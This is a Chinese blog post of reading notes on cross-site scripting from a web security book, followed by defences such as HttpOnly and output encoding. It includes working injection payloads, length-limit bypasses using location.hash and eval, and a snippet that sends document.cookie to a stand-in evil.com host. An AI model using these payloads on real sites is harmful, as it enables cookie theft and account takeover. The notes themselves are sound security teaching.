<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【读书笔记】《白帽子讲web安全》跨站脚本攻击 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【读书笔记】《白帽子讲web安全》跨站脚本攻击" />
<meta property="og:description" content="目录
前言：
第二篇 客户端脚本安全
第3章 跨站脚本攻击（XSS）
3.1XSS简介
3.2XSS攻击进阶
3.2.1初探XSS Payload
3.2.2强大的XSS Payload
3.2.2.1 构造GET与POST请求
3.2.2.2XSS钓鱼
3.2.2.3识别用户浏览器
3.2.2.4识别用户安装的软件
3.2.2.5CSS History Hack
3.2.2.6获取用户的真实IP地址
3.2.3XSS攻击平台
3.2.4终极武器：XSS Worm
3.2.5调试JavaScript
3.2.6XSS构造技巧
3.2.6.1利用字符编码
3.2.6.2绕过长度限制
3.2.6.3使用&lt;base&gt;标签
3.2.6.4window.name的妙用
3.2.7变废为宝：Mission Impossible
3.2.8最容易被忽视的角落：Flash XSS
3.2.9真的高枕无忧吗：JavaScript开发框架
3.3XSS的防御
3.3.1四两拨千斤：HttpOnly
3.3.2输入检查
3.3.3输出检查
3.3.4正确地防御XSS
3.3.5处理富文本
3.3.6防御DOM Based XSS
3.3.7换个角度看XSS的风险
3.4小结
前言： 根据个人浅薄的理解，仅记录我现阶段认为有直接价值的部分，余下只作了解。
（也就是考试周打发时间的消遣，换换脑子，看书更多是观念与知识面上的学习）
第二篇 客户端脚本安全 第3章 跨站脚本攻击（XSS） 3.1XSS简介 跨站脚本攻击，Cross Site Script，在安全领域叫XSS。
XSS攻击通常是黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时控制用户浏览器。
XSS根据效果的不同可以分成三类：
①反射型XSS：又叫“非持久型XSS”，其只是简单地把用户输入的数据“反射”给浏览器。黑客需要诱使用户“点击”一个恶意链接才能攻击成功。
②存储型XSS：又叫“持久型XSS”，这种XSS具有很强的稳定性，其会把黑客输入的恶意数据“存储”在服务器端。所有向服务器请求这段数据的用户，都会在他们的浏览器执行恶意代码。
③DOM型XSS：其是通过修改页面的DOM节点形成的XSS，这种类型的XSS并非按照“数据是否存放在服务器端”来划分，从效果上来说也是反射型XSS。
这里给出两种payload:
&#39; onclick=alert(/xss/) // 拼接后：&lt;a href=&#39;&#39; onclick=alert(/xss/) //&#39;&gt;testLink&lt;/a&gt; &#39;&gt;&lt;img src=# onerror=alert(/xss/) /&gt;&lt;&#39; 拼接后：&lt;a href=&#39;&#39;&gt;&lt;img src=# onerror=alert(/xss/) /&gt;&lt;&#39;&#39;&gt;testLink&lt;/a&gt; 3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/413d05bc40e3fd3ace7edbc04a2904ad/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-08T00:22:51+08:00" />
<meta property="article:modified_time" content="2024-01-08T00:22:51+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【读书笔记】《白帽子讲web安全》跨站脚本攻击</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%E5%89%8D%E8%A8%80%EF%BC%9A-toc" style="margin-left:0px;"><a href="#%E5%89%8D%E8%A8%80%EF%BC%9A" rel="nofollow">前言：</a></p> 
<p id="%E7%AC%AC%E4%BA%8C%E7%AF%87%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%9A%E6%9C%AC%E5%AE%89%E5%85%A8-toc" style="margin-left:0px;"><a href="#%E7%AC%AC%E4%BA%8C%E7%AF%87%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%9A%E6%9C%AC%E5%AE%89%E5%85%A8" rel="nofollow">第二篇 客户端脚本安全</a></p> 
<p id="%E7%AC%AC3%E7%AB%A0%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89-toc" style="margin-left:0px;"><a href="#%E7%AC%AC3%E7%AB%A0%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89" rel="nofollow">第3章 跨站脚本攻击（XSS）</a></p> 
<p id="3.1XSS%E7%AE%80%E4%BB%8B-toc" style="margin-left:0px;"><a href="#3.1XSS%E7%AE%80%E4%BB%8B" rel="nofollow">3.1XSS简介</a></p> 
<p id="3.2XSS%E6%94%BB%E5%87%BB%E8%BF%9B%E9%98%B6-toc" style="margin-left:0px;"><a href="#3.2XSS%E6%94%BB%E5%87%BB%E8%BF%9B%E9%98%B6" rel="nofollow">3.2XSS攻击进阶</a></p> 
<p id="3.2.1%E5%88%9D%E6%8E%A2XSS%20Payload-toc" style="margin-left:40px;"><a href="#3.2.1%E5%88%9D%E6%8E%A2XSS%20Payload" rel="nofollow">3.2.1初探XSS Payload</a></p> 
<p id="3.2.2%E5%BC%BA%E5%A4%A7%E7%9A%84XSS%20Payload-toc" style="margin-left:40px;"><a href="#3.2.2%E5%BC%BA%E5%A4%A7%E7%9A%84XSS%20Payload" rel="nofollow">3.2.2强大的XSS Payload</a></p> 
<p id="3.2.2.1%20%E6%9E%84%E9%80%A0GET%E4%B8%8EPOST%E8%AF%B7%E6%B1%82-toc" style="margin-left:80px;"><a href="#3.2.2.1%20%E6%9E%84%E9%80%A0GET%E4%B8%8EPOST%E8%AF%B7%E6%B1%82" rel="nofollow">3.2.2.1 构造GET与POST请求</a></p> 
<p id="3.2.2.2XSS%E9%92%93%E9%B1%BC-toc" style="margin-left:80px;"><a href="#3.2.2.2XSS%E9%92%93%E9%B1%BC" rel="nofollow">3.2.2.2XSS钓鱼</a></p> 
<p id="3.2.2.3%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E6%B5%8F%E8%A7%88%E5%99%A8-toc" style="margin-left:80px;"><a href="#3.2.2.3%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E6%B5%8F%E8%A7%88%E5%99%A8" rel="nofollow">3.2.2.3识别用户浏览器</a></p> 
<p id="3.2.2.4%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6-toc" style="margin-left:80px;"><a href="#3.2.2.4%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6" rel="nofollow">3.2.2.4识别用户安装的软件</a></p> 
<p id="3.2.2.5CSS%20History%20Hack-toc" style="margin-left:80px;"><a href="#3.2.2.5CSS%20History%20Hack" rel="nofollow">3.2.2.5CSS History Hack</a></p> 
<p id="3.2.2.6%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80-toc" style="margin-left:80px;"><a href="#3.2.2.6%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80" rel="nofollow">3.2.2.6获取用户的真实IP地址</a></p> 
<p id="3.2.3XSS%E6%94%BB%E5%87%BB%E5%B9%B3%E5%8F%B0-toc" style="margin-left:40px;"><a href="#3.2.3XSS%E6%94%BB%E5%87%BB%E5%B9%B3%E5%8F%B0" rel="nofollow">3.2.3XSS攻击平台</a></p> 
<p id="3.2.4%E7%BB%88%E6%9E%81%E6%AD%A6%E5%99%A8%EF%BC%9AXSS%20Worm-toc" style="margin-left:40px;"><a href="#3.2.4%E7%BB%88%E6%9E%81%E6%AD%A6%E5%99%A8%EF%BC%9AXSS%20Worm" rel="nofollow">3.2.4终极武器：XSS Worm</a></p> 
<p id="3.2.5%E8%B0%83%E8%AF%95JavaScript-toc" style="margin-left:40px;"><a href="#3.2.5%E8%B0%83%E8%AF%95JavaScript" rel="nofollow">3.2.5调试JavaScript</a></p> 
<p id="3.2.6XSS%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7-toc" style="margin-left:40px;"><a href="#3.2.6XSS%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7" rel="nofollow">3.2.6XSS构造技巧</a></p> 
<p id="3.2.6.1%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81-toc" style="margin-left:80px;"><a href="#3.2.6.1%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" rel="nofollow">3.2.6.1利用字符编码</a></p> 
<p id="3.2.6.2%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6-toc" style="margin-left:80px;"><a href="#3.2.6.2%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6" rel="nofollow">3.2.6.2绕过长度限制</a></p> 
<p id="3.2.6.3%E4%BD%BF%E7%94%A8%3Cbase%3E%E6%A0%87%E7%AD%BE-toc" style="margin-left:80px;"><a href="#3.2.6.3%E4%BD%BF%E7%94%A8%3Cbase%3E%E6%A0%87%E7%AD%BE" rel="nofollow">3.2.6.3使用</a>&lt;base&gt;标签</p> 
<p></p> 
<p id="3.2.6.4window.name%E7%9A%84%E5%A6%99%E7%94%A8-toc" style="margin-left:80px;"><a href="#3.2.6.4window.name%E7%9A%84%E5%A6%99%E7%94%A8" rel="nofollow">3.2.6.4window.name的妙用</a></p> 
<p id="3.2.7%E5%8F%98%E5%BA%9F%E4%B8%BA%E5%AE%9D%EF%BC%9AMission%20Impossible-toc" style="margin-left:40px;"><a href="#3.2.7%E5%8F%98%E5%BA%9F%E4%B8%BA%E5%AE%9D%EF%BC%9AMission%20Impossible" rel="nofollow">3.2.7变废为宝：Mission Impossible</a></p> 
<p id="3.2.8%E6%9C%80%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86%E7%9A%84%E8%A7%92%E8%90%BD%EF%BC%9AFlash%20XSS-toc" style="margin-left:40px;"><a href="#3.2.8%E6%9C%80%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86%E7%9A%84%E8%A7%92%E8%90%BD%EF%BC%9AFlash%20XSS" rel="nofollow">3.2.8最容易被忽视的角落：Flash XSS</a></p> 
<p id="3.2.9%E7%9C%9F%E7%9A%84%E9%AB%98%E6%9E%95%E6%97%A0%E5%BF%A7%E5%90%97%EF%BC%9AJavaScript%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6-toc" style="margin-left:40px;"><a href="#3.2.9%E7%9C%9F%E7%9A%84%E9%AB%98%E6%9E%95%E6%97%A0%E5%BF%A7%E5%90%97%EF%BC%9AJavaScript%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6" rel="nofollow">3.2.9真的高枕无忧吗：JavaScript开发框架</a></p> 
<p id="3.3XSS%E7%9A%84%E9%98%B2%E5%BE%A1-toc" style="margin-left:0px;"><a href="#3.3XSS%E7%9A%84%E9%98%B2%E5%BE%A1" rel="nofollow">3.3XSS的防御</a></p> 
<p id="3.3.1%E5%9B%9B%E4%B8%A4%E6%8B%A8%E5%8D%83%E6%96%A4%EF%BC%9AHttpOnly-toc" style="margin-left:40px;"><a href="#3.3.1%E5%9B%9B%E4%B8%A4%E6%8B%A8%E5%8D%83%E6%96%A4%EF%BC%9AHttpOnly" rel="nofollow">3.3.1四两拨千斤：HttpOnly</a></p> 
<p id="3.3.2%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5-toc" style="margin-left:40px;"><a href="#3.3.2%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5" rel="nofollow">3.3.2输入检查</a></p> 
<p id="3.3.3%E8%BE%93%E5%87%BA%E6%A3%80%E6%9F%A5-toc" style="margin-left:40px;"><a href="#3.3.3%E8%BE%93%E5%87%BA%E6%A3%80%E6%9F%A5" rel="nofollow">3.3.3输出检查</a></p> 
<p id="3.3.4%E6%AD%A3%E7%A1%AE%E5%9C%B0%E9%98%B2%E5%BE%A1XSS-toc" style="margin-left:40px;"><a href="#3.3.4%E6%AD%A3%E7%A1%AE%E5%9C%B0%E9%98%B2%E5%BE%A1XSS" rel="nofollow">3.3.4正确地防御XSS</a></p> 
<p id="3.3.5%E5%A4%84%E7%90%86%E5%AF%8C%E6%96%87%E6%9C%AC-toc" style="margin-left:40px;"><a href="#3.3.5%E5%A4%84%E7%90%86%E5%AF%8C%E6%96%87%E6%9C%AC" rel="nofollow">3.3.5处理富文本</a></p> 
<p id="3.3.6%E9%98%B2%E5%BE%A1DOM%20Based%20XSS-toc" style="margin-left:40px;"><a href="#3.3.6%E9%98%B2%E5%BE%A1DOM%20Based%20XSS" rel="nofollow">3.3.6防御DOM Based XSS</a></p> 
<p id="3.3.7%E6%8D%A2%E4%B8%AA%E8%A7%92%E5%BA%A6%E7%9C%8BXSS%E7%9A%84%E9%A3%8E%E9%99%A9-toc" style="margin-left:40px;"><a href="#3.3.7%E6%8D%A2%E4%B8%AA%E8%A7%92%E5%BA%A6%E7%9C%8BXSS%E7%9A%84%E9%A3%8E%E9%99%A9" rel="nofollow">3.3.7换个角度看XSS的风险</a></p> 
<p id="3.4%E5%B0%8F%E7%BB%93-toc" style="margin-left:0px;"><a href="#3.4%E5%B0%8F%E7%BB%93" rel="nofollow">3.4小结</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="%E5%89%8D%E8%A8%80%EF%BC%9A" style="background-color:transparent;">前言：</h2> 
<p>根据个人浅薄的理解，仅记录我现阶段认为有直接价值的部分，余下只作了解。</p> 
<p>（也就是考试周打发时间的消遣，换换脑子，看书更多是观念与知识面上的学习）</p> 
<h2 id="%E7%AC%AC%E4%BA%8C%E7%AF%87%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%9A%E6%9C%AC%E5%AE%89%E5%85%A8">第二篇 客户端脚本安全</h2> 
<h2 id="%E7%AC%AC3%E7%AB%A0%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89">第3章 跨站脚本攻击（XSS）</h2> 
<h2 id="3.1XSS%E7%AE%80%E4%BB%8B" style="background-color:transparent;">3.1XSS简介</h2> 
<p>跨站脚本攻击，Cross Site Script，在安全领域叫XSS。</p> 
<p>XSS攻击通常是黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时控制用户<strong>浏览器</strong>。</p> 
<p>XSS根据效果的不同可以分成三类：</p> 
<p>①反射型XSS：又叫“非持久型XSS”，其只是简单地把用户输入的数据“反射”给浏览器。黑客需要诱使用户“点击”一个恶意链接才能攻击成功。</p> 
<p>②存储型XSS：又叫“持久型XSS”，这种XSS具有很强的稳定性，其会把黑客输入的恶意数据“存储”在服务器端。所有向服务器请求这段数据的用户，都会在他们的浏览器执行恶意代码。</p> 
<p>③DOM型XSS：其是通过修改页面的DOM节点形成的XSS，这种类型的XSS并非按照“数据是否存放在服务器端”来划分，从效果上来说也是反射型XSS。</p> 
<p><img alt="" height="967" src="https://images2.imgbox.com/f9/0d/GCgRgnvC_o.png" width="1200"></p> 
<p>这里给出两种payload:</p> 
<pre><code class="hljs">' onclick=alert(/xss/) //
拼接后：&lt;a href='' onclick=alert(/xss/) //'&gt;testLink&lt;/a&gt;</code></pre> 
<pre><code class="hljs">'&gt;&lt;img src=# onerror=alert(/xss/) /&gt;&lt;'
拼接后：&lt;a href=''&gt;&lt;img src=# onerror=alert(/xss/) /&gt;&lt;''&gt;testLink&lt;/a&gt;</code></pre> 
<p></p> 
<h2 id="3.2XSS%E6%94%BB%E5%87%BB%E8%BF%9B%E9%98%B6" style="background-color:transparent;">3.2XSS攻击进阶</h2> 
<h3 id="3.2.1%E5%88%9D%E6%8E%A2XSS%20Payload" style="background-color:transparent;">3.2.1初探XSS Payload</h3> 
<p>XSS Payload实际上就是JS脚本，所以任何JS脚本能实现的功能，XSS Payload都能做到。</p> 
<p>一个最常见的payload就是读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p> 
<p>如下所示，攻击者先加载一个远程脚本：</p> 
<pre><code class="hljs">http://www.a.com/test.htm?abc="&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code></pre> 
<p>在evil.js中，可以通过如下代码窃取Cookie</p> 
<pre><code class="hljs">var img=document.createElement("img");
img.src="http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
</code></pre> 
<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。</p> 
<p>事实上，http://www.evil.com/log并不一定要存在，因为这个请求会在远程服务器的web日志中留下记录。</p> 
<p>通过XSS攻击，我们可以完成“Cookie劫持”攻击，直接登录进用户的账户。</p> 
<p></p> 
<h3 id="3.2.2%E5%BC%BA%E5%A4%A7%E7%9A%84XSS%20Payload" style="background-color:transparent;">3.2.2强大的XSS Payload</h3> 
<p>"Cookie劫持"并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站则可能会把Cookie与客户端IP绑定，从而使得XSS窃取的Cookie失去意义。</p> 
<p>尽管如此，在XSS攻击成功后，攻击者仍然有许多方式能控制用户的浏览器。</p> 
<h4 id="3.2.2.1%20%E6%9E%84%E9%80%A0GET%E4%B8%8EPOST%E8%AF%B7%E6%B1%82" style="background-color:transparent;">3.2.2.1 构造GET与POST请求</h4> 
<p>一个网站的应用，只需要接收HTTP协议中的GET或POST请求，即可完成所有操作。对于攻击者来说，仅通过JS就可以让浏览器发出这两种请求。</p> 
<p>也就是说XSS攻击可以通过模拟GET、POST请求操作用户的浏览器。可以进行一些危险操作，也可以将敏感信息发送到远程服务器上，这只需要构造不同的GET或POST请求即可，书里不做赘述。</p> 
<h4 id="3.2.2.2XSS%E9%92%93%E9%B1%BC">3.2.2.2XSS钓鱼</h4> 
<p>用JS在当前界面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其将被发送至黑客的远程服务器上。</p> 
<h4 id="3.2.2.3%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E6%B5%8F%E8%A7%88%E5%99%A8">3.2.2.3识别用户浏览器</h4> 
<p>攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。XSS能够帮助攻击者快速达到收集信息的目的。</p> 
<h4 id="3.2.2.4%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6">3.2.2.4识别用户安装的软件</h4> 
<p>知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件。</p> 
<p>这种方法很早就被用于“挂马攻击”——黑客通过用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。</p> 
<h4 id="3.2.2.5CSS%20History%20Hack">3.2.2.5CSS History Hack</h4> 
<p>通过CSS来发现一个用户曾经访问过的网站，其原理时利用style的visited属性——如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同。</p> 
<h4 id="3.2.2.6%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80">3.2.2.6获取用户的真实IP地址</h4> 
<p>通过XSS Payload还有办法获取一些客户端的本地IP地址。</p> 
<p>JS本身并没有提供获取本地IP地址的能力，一般来说要调用第三方API获取客户端本地IP地址。</p> 
<p></p> 
<h3 id="3.2.3XSS%E6%94%BB%E5%87%BB%E5%B9%B3%E5%8F%B0" style="background-color:transparent;">3.2.3XSS攻击平台</h3> 
<p>为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。</p> 
<h3 id="3.2.4%E7%BB%88%E6%9E%81%E6%AD%A6%E5%99%A8%EF%BC%9AXSS%20Worm">3.2.4终极武器：XSS Worm</h3> 
<h3 id="3.2.5%E8%B0%83%E8%AF%95JavaScript">3.2.5调试JavaScript</h3> 
<h3 id="3.2.6XSS%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7" style="background-color:transparent;">3.2.6XSS构造技巧</h3> 
<h4 id="3.2.6.1%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" style="background-color:transparent;">3.2.6.1利用字符编码</h4> 
<h4 id="3.2.6.2%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6" style="background-color:transparent;">3.2.6.2绕过长度限制</h4> 
<p>很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的。</p> 
<p>①攻击者可以利用事件（Event）来缩短所需要的字节数。如：</p> 
<pre><code class="hljs">假设下面代码存在一个XSS漏洞：
&lt;input type=text value="$var" /&gt;
攻击者可以这样构造XSS：
"&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
如果有长度限制
可以利用事件来缩短长度：
" onclick=alert(1)//</code></pre> 
<p> ②最好的办法是把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload。</p> 
<p>最常用的一个“藏代码”的地方，就是“location.hash”。</p> 
<p>接着上面的例子就可以继续优化：</p> 
<pre><code class="hljs">" onclick="eval(location.hash.substr(1))
因为location.hash的第一个字符是#，所以必须去除第一个字符。此时构造出的URL为：
http://www.a.com/test.html#alert(1)</code></pre> 
<p>location.hash本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够写很长的payload了。要是地址栏的长度也不够用，还可以再使用加载远程JS的方法，来写更多的代码。</p> 
<p>③利用注释符绕过长度限制</p> 
<p>比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用HTML的注释符号，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个&lt;input&gt;标签。</p> 
<p></p> 
<h4 id="3.2.6.3%E4%BD%BF%E7%94%A8%3Cbase%3E%E6%A0%87%E7%AD%BE" style="background-color:transparent;">3.2.6.3使用&lt;base&gt;标签</h4> 
<p>&lt;base&gt;标签并不常用，它的作用是定义页面上的所有使用“相对路径”标签的hosting地址。</p> 
<p>&lt;base&gt;标签将指定其后的标签相对路径默认从base的href取URL。</p> 
<p>攻击者如果在页面中插入了&lt;base&gt;标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面的所有使用“相对路径”的标签。</p> 
<p></p> 
<h4 id="3.2.6.4window.name%E7%9A%84%E5%A6%99%E7%94%A8">3.2.6.4window.name的妙用</h4> 
<p>window对象是浏览器的窗体，而非document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据。</p> 
<p></p> 
<h3 id="3.2.7%E5%8F%98%E5%BA%9F%E4%B8%BA%E5%AE%9D%EF%BC%9AMission%20Impossible">3.2.7变废为宝：Mission Impossible</h3> 
<h3 id="3.2.8%E6%9C%80%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86%E7%9A%84%E8%A7%92%E8%90%BD%EF%BC%9AFlash%20XSS">3.2.8最容易被忽视的角落：Flash XSS</h3> 
<h3 id="3.2.9%E7%9C%9F%E7%9A%84%E9%AB%98%E6%9E%95%E6%97%A0%E5%BF%A7%E5%90%97%EF%BC%9AJavaScript%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6" style="background-color:transparent;">3.2.9真的高枕无忧吗：JavaScript开发框架</h3> 
<p>利用JS框架中的各种强大功能，可以快速而简洁地完成前端开发。</p> 
<p>一些JS开发框架也曾暴露过一些XSS漏洞。使用JS框架并不能让开发者高枕无忧，同样可能存在安全问题。除了需要关注框架本身的安全外，开发者还要提高安全意识，理解并正确地使用开发框架。</p> 
<p></p> 
<h2 id="3.3XSS%E7%9A%84%E9%98%B2%E5%BE%A1">3.3XSS的防御</h2> 
<p>浏览器内置了一些对抗XSS的措施，比如Firefox的CSP、Noscript拓展，IE8内置的XSS Filter等。对于网站来说，也应该寻找优秀的解决方案，保护用户不被XSS攻击。</p> 
<h3 id="3.3.1%E5%9B%9B%E4%B8%A4%E6%8B%A8%E5%8D%83%E6%96%A4%EF%BC%9AHttpOnly">3.3.1四两拨千斤：HttpOnly</h3> 
<p>浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。</p> 
<p>严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。</p> 
<p>HttpOnly是在Set-Cookie时标记的。</p> 
<p>举例：</p> 
<pre><code class="hljs">&lt;?php
header("Set-Cookie: cookie1=test1;");
header("Set-Cookie: cookie2=test2;httponly", false);
?&gt;

&lt;script&gt;
    alert(document.cookie);
&lt;/script&gt;</code></pre> 
<p>运行这段代码只会弹窗cookie1=test1，因为cookie2有httponly保护没办法被js读取。</p> 
<p></p> 
<h3 id="3.3.2%E8%BE%93%E5%85%A5%E6%A3%80%E6%9F%A5">3.3.2输入检查</h3> 
<p>输入检查有点像一种“白名单”，也可以让一些基于特殊字符的攻击失效。</p> 
<p>目前Web开发的普遍做法，是同时在客户端JS中和服务器端代码中实现相同的输入检查。客户端JS的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。</p> 
<p>输入数据，还可能会被展示在多个地方，每个地方的语境可能不同，如果使用单一替换操作，则可能会出现问题。</p> 
<p></p> 
<h3 id="3.3.3%E8%BE%93%E5%87%BA%E6%A3%80%E6%9F%A5">3.3.3输出检查</h3> 
<p>“输入检查”存在很多问题，我们可以采用“输出检查”。</p> 
<p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p> 
<p>针对HTML代码的编码方式是HtmlEncode</p> 
<p>HtmlEncode并非专用名词，它只是一种函数实现。它的作用是将字符转换成HTMLEntities</p> 
<p></p> 
<p><em>HTML 实体可以帮助防止跨站脚本攻击（XSS）的一种常用方法是将用户输入的特殊字符进行转义，确保它们在 HTML 中被正确解析而不被当作标签或脚本执行。</em></p> 
<p><em>当用户输入的文本中包含特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, <code>'</code> 等），如果直接在 HTML 中显示，这些字符可能会被浏览器解释为 HTML 标签或 JavaScript 代码，从而导致恶意脚本的注入和执行。</em></p> 
<p><em>通过使用 HTML 实体，可以将特殊字符转义为安全的字符实体，这样它们就不会被浏览器解析为标签或代码。例如，将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，将 <code>&amp;</code> 转义为 <code>&amp;amp;</code>，等等。</em></p> 
<p><em>当用户输入的文本经过 HTML 实体编码后插入 HTML 页面中时，浏览器会将实体转义回原始字符，但不会将其解析为标签或代码。这样可以防止恶意脚本的注入，确保用户输入的文本只作为纯文本显示。</em></p> 
<p></p> 
<p>针对JS的编码方式是JavascriptEncode</p> 
<p></p> 
<p><em>JavaScriptEncode 的实现方法通常是将特殊字符转义为 Unicode 编码，例如将 <code>&lt;</code> 转义为 <code>\x3c</code>，将 <code>&gt;</code> 转义为 <code>\x3e</code>，将 <code>&amp;</code> 转义为 <code>\x26</code> 等。这样可以确保特殊字符不会被解释为 JavaScript 代码，而只会被当做普通字符串处理。</em></p> 
<p></p> 
<p>此外还有许多用于各种情况的编码函数，如XMLEncode、JSONEncode</p> 
<p></p> 
<h3 id="3.3.4%E6%AD%A3%E7%A1%AE%E5%9C%B0%E9%98%B2%E5%BE%A1XSS" style="background-color:transparent;">3.3.4正确地防御XSS</h3> 
<p>为了更好地设计XSS防御方案，需要认清XSS产生的本质原因。</p> 
<p>XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。</p> 
<p>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p> 
<p>在HTML标签中输出：对变量使用HtmlEncode</p> 
<p>在HTML属性中输出：对变量使用HtmlEncode</p> 
<p>在&lt;script&gt;标签中输出：对变量使用JavascriptEncode</p> 
<p>在事件中输出：对变量使用JavascriptEncode</p> 
<p>在CSS中输出：</p> 
<p>在CSS和style,style attribute中形成XSS的方式非常多样化，参考下面几个XSS的例子。</p> 
<p><img alt="" height="299" src="https://images2.imgbox.com/c8/ba/dLrHJtVx_o.png" width="1200"></p> 
<p> 所以尽可能禁止用户可控的变量在&lt;style&gt;标签、HTML标签的style属性以及CSS文件中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的encodeForCSS()函数。</p> 
<p></p> 
<p>在地址中输出：使用URLEncode</p> 
<p></p> 
<h3 id="3.3.5%E5%A4%84%E7%90%86%E5%AF%8C%E6%96%87%E6%9C%AC">3.3.5处理富文本</h3> 
